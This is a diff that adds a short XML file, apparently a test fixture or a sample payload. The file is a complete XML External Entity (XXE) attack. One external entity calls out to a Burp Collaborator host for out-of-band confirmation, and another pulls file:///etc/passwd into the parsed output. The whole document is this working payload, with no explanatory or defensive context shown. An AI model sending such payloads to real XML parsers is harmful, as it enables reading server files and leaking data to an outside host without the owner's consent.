@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY % oob SYSTEM "http://collab-test.burpcollaborator.net/xml_xxe">
+  %oob;
+  <!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<root><data>&file;</data></root>
